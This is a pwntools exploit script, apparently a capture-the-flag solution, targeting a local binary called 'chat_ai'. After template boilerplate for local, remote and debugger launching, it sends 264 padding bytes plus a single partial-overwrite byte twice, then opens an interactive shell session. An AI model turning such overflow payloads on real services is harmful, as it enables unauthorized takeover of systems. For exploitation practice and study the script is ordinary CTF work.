from pwn import *
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent
exe = ELF(str(BASE_DIR / "chat_ai"))

context.terminal = ["tmux", "splitw", "-h"]

if exe.bits == 32:
    lindbg = "/home/st2l/ida-pro-9.0/dbgsrv/linux_server32"
else:
    lindbg = "/home/st2l/ida-pro-9.0/dbgsrv/linux_server"


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or "127.0.0.1"
port = int(args.PORT or 1234)


def local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug(
            [exe.path] + argv, gdbscript=gdbscript, cwd=str(BASE_DIR), *a, **kw
        )
    elif args.EDB:
        return process(["edb", "--run", exe.path] + argv, cwd=str(BASE_DIR), *a, **kw)
    elif args.QIRA:
        return process(["qira", exe.path] + argv, cwd=str(BASE_DIR), *a, **kw)
    elif args.IDA:
        return process([lindbg], cwd=str(BASE_DIR), *a, **kw)
    else:
        return process([exe.path] + argv, cwd=str(BASE_DIR), *a, **kw)


def remote(argv=[], *a, **kw):
    """Connect to the process on the remote host"""
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak main
continue
""".format(**locals())

info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sna = lambda msg, data: io.sendlineafter(msg, str(data).encode())
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
sn = lambda data: io.sendline(str(data).encode())
s = lambda data: io.send(data)
ru = lambda msg: io.recvuntil(msg)

io = start()

io.recvuntil(b">")
io.send(b"a" * 264 + b"M")
io.recvuntil(b">")
io.send(b"a" * 264 + b"\xc6")

io.interactive()
